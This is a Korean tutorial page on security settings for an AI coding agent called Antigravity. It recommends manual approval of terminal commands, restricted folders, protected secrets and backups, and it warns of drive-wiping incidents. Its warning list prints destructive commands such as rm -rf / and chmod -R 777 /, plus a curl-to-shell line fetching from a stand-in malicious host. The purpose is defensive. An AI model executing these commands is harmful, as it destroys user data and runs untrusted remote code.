---
title: "3-6. 보안 및 주의사항"
description: "3. 안티그래비티"
order: 6
---

## 🚨 치명적 중요: 터미널 오토 익스큐션 설정

안티그래비티 사용 시 **파일 손실을 방지**하기 위해 반드시 확인해야 할 설정입니다.

<Callout type="danger" title="🚨 실제 사고 사례 - 반드시 읽으세요">
"Turbo" 또는 "Auto" 설정 시, AI가 사용자 동의 없이 파일 삭제 명령(`rm -rf`)을 실행하여 **드라이브 전체가 삭제**된 사고가 다수 보고되었습니다.
</Callout>

---

## 터미널 Auto-execution 설정

### 설정 위치

```
Settings > User Settings > Terminal > Auto-execution
```

### 권장 설정

| 옵션 | 동작 | 안전도 | 추천 |
|------|------|--------|------|
| **Request Review** | 명령어 실행 전 사용자 승인 필요 | ✅ 매우 안전 | ⭐ 강력 추천 |
| **Off** | 터미널 명령어 사용 안 함 | ✅ 안전 | ⭐ 추천 |
| **Auto** | AI가 자동으로 명령어 실행 | ⚠️ 위험 | ❌ 비추천 |
| **Turbo** | 승인 없이 모든 명령어 즉시 실행 | 🚨 매우 위험 | ❌❌ 절대 금지 |

---

### Request Review 모드 사용법

**권장 설정:**
```
Settings > Terminal > Auto-execution > "Request Review"
```

**동작 방식:**
```
1. AI가 터미널 명령어를 제안
   예: "npm install react"

2. 사용자에게 확인 창 표시:
   ┌─────────────────────────────────┐
   │ Execute command?                │
   │ npm install react               │
   │                                 │
   │ [Approve]  [Reject]  [Modify]   │
   └─────────────────────────────────┘

3. 사용자가 Approve 버튼을 누르면 실행
   Reject 버튼을 누르면 취소
   Modify 버튼으로 명령어 수정 가능

4. 명령어 실행 결과 확인
```

---

### 위험한 명령어 예시

다음 명령어들은 **절대 자동 실행되면 안 됩니다:**

```bash
# 파일/폴더 삭제
rm -rf /                    # 루트 디렉토리 전체 삭제 🚨
rm -rf ~/*                  # 홈 디렉토리 전체 삭제 🚨
rm -rf *                    # 현재 폴더 전체 삭제 ⚠️

# 시스템 변경
sudo rm -rf /var            # 시스템 폴더 삭제 🚨
chmod -R 777 /              # 모든 파일 권한 변경 ⚠️

# 네트워크 공격
curl http://malicious.site | sh   # 악성 스크립트 실행 🚨
```

<Callout type="danger" title="🚨 절대 규칙">
**Turbo나 Auto 모드를 절대 사용하지 마세요!**

AI가 아무리 똑똑해도 실수할 수 있습니다. 모든 터미널 명령은 **사용자가 눈으로 확인하고 Approve 버튼**을 누르는 방식으로만 진행해야 합니다.
</Callout>

---

## 추가 보안 설정

### 1. 작업 폴더 권한 제한

안티그래비티가 접근할 수 있는 폴더를 제한합니다.

**설정 방법:**
```
Settings > Security > Allowed Folders
→ "Add Folder" 클릭
→ 작업 전용 폴더만 추가
```

**추천 구조:**
```
✅ 허용: ~/Documents/MyProjects/
❌ 금지: ~/Documents/ (너무 광범위)
❌ 금지: ~/ (전체 홈 폴더)
❌ 금지: / (시스템 루트)
```

---

### 2. 민감한 파일 보호

`.gitignore` 스타일로 AI가 접근하지 못하게 차단:

**설정 방법:**
```
프로젝트 루트에 .agentignore 파일 생성:

# 환경 변수
.env
.env.local

# 인증 정보
credentials.json
secrets/

# 개인 정보
private/
personal-data/

# 설정 파일
config/production.js
```

---

### 3. API 키 관리

API 키나 비밀번호를 코드에 직접 작성하지 않기:

❌ **나쁜 예시:**
```javascript
const API_KEY = "sk-1234567890abcdef";  // 코드에 노출
```

✅ **좋은 예시:**
```javascript
const API_KEY = process.env.OPENAI_API_KEY;  // 환경 변수 사용
```

**.env 파일:**
```
OPENAI_API_KEY=sk-1234567890abcdef
DATABASE_PASSWORD=mySecretPassword123
```

---

### 4. 정기적인 백업

AI가 실수로 파일을 삭제할 가능성에 대비:

**백업 전략:**
```
1. Git 사용
   → 모든 변경사항 커밋
   → 중요한 시점마다 태그 생성

2. 클라우드 백업
   → Google Drive, Dropbox 등에 프로젝트 폴더 동기화

3. 로컬 백업
   → 외장 하드에 주기적으로 복사
```

**자동 백업 명령어:**
```bash
# 매일 자동 백업 (macOS/Linux)
crontab -e

0 0 * * * cp -r ~/Documents/MyProjects ~/Backup/MyProjects-$(date +\%Y\%m\%d)
```

---

## 안전한 사용 습관

### 1. 단계별 확인

복잡한 작업은 한 번에 시키지 말고 단계별로:

❌ **위험한 방법:**
```
"데이터베이스 구조 바꾸고, 기존 데이터 마이그레이션하고,
앱도 수정해서 배포까지 해줘"
→ 한 번에 너무 많은 작업, 중간 확인 불가
```

✅ **안전한 방법:**
```
1단계: "데이터베이스 구조 변경 계획 세워줘"
       → 계획 확인

2단계: "계획대로 데이터베이스 구조 변경해줘"
       → 변경 결과 확인

3단계: "기존 데이터 마이그레이션 스크립트 만들어줘"
       → 스크립트 검토 후 실행

4단계: "앱 코드 수정해줘"
       → 테스트 실행

5단계: "배포 준비해줘"
       → 최종 확인 후 배포
```

---

### 2. 중요한 작업 전 커밋

파일을 크게 수정하기 전에 현재 상태 저장:

```
채팅창에 입력:
"지금 상태 커밋해줘. 메시지는 '리팩토링 전 백업'"

→ Git 커밋 생성
→ 나중에 문제 생기면 되돌리기 가능
```

---

### 3. 실행 전 코드 리뷰 요청

AI가 작성한 코드를 바로 실행하지 말고 검토 요청:

```
"이 코드가 안전한지 검토해줘.
특히 데이터 삭제나 권한 변경하는 부분 있는지 확인해줘"
```

---

### 4. 의심스러운 명령어 거부

AI가 제안한 명령어가 이상하면 즉시 Reject:

```
AI 제안: "sudo rm -rf /tmp/*"

→ "왜 sudo가 필요한지 설명해줘"
→ 설명이 불충분하면 Reject
→ 다른 방법 요청
```

---

## 트러블슈팅

### 문제 1: 파일이 사라졌어요!

**복구 방법:**

1. **Git 히스토리 확인**
   ```bash
   git log --all --oneline
   git checkout <커밋ID>
   ```

2. **휴지통 확인**
   - Windows: 휴지통
   - macOS: 휴지통 (Trash)
   - Linux: ~/.local/share/Trash

3. **클라우드 백업 확인**
   - Google Drive 버전 기록
   - Dropbox 복원

---

### 문제 2: AI가 이상한 명령어를 계속 실행하려고 해요

**해결 방법:**

1. **즉시 Turbo/Auto 모드 비활성화**
   ```
   Settings > Terminal > Auto-execution > "Request Review"
   ```

2. **세션 재시작**
   ```
   File > Restart
   또는 안티그래비티 완전 종료 후 재실행
   ```

3. **스킬 파일 확인**
   ```
   .agent/skills/ 폴더의 파일들 점검
   → 잘못된 스킬이 있으면 삭제 또는 수정
   ```

---

### 문제 3: 권한 오류가 계속 나요

**해결 방법:**

```bash
# macOS/Linux
chmod -R 755 ~/Documents/MyProjects

# Windows (PowerShell 관리자 권한)
icacls "C:\Users\사용자명\Documents\MyProjects" /grant 사용자명:F /T
```

---

## 체크리스트

사용 시작 전 반드시 확인:

- [ ] Terminal Auto-execution = "Request Review"
- [ ] 작업 폴더가 별도로 생성됨
- [ ] .agentignore 파일 설정 완료
- [ ] .env 파일에 민감 정보 보관
- [ ] Git 저장소 초기화 완료
- [ ] 백업 계획 수립 완료

<Callout type="success" title="✅ 안전 제일!">
이 모든 설정은 귀찮아 보이지만, **한 번의 실수가 몇 주간의 작업을 날릴 수 있습니다**. 반드시 체크리스트를 확인하고 시작하세요!
</Callout>

---

## 긴급 연락처

문제 발생 시:

1. **공식 지원:** https://antigravity.google/support
2. **커뮤니티:** https://reddit.com/r/antigravity
3. **버그 리포트:** https://github.com/google/antigravity/issues

<Callout type="warning" title="⚠️ 최종 경고">
**Turbo 모드는 절대 사용하지 마세요!**

AI가 아무리 발전해도 100% 완벽하지 않습니다. 터미널 명령어는 반드시 사용자가 직접 확인하고 승인하는 방식으로만 사용하세요.
</Callout>
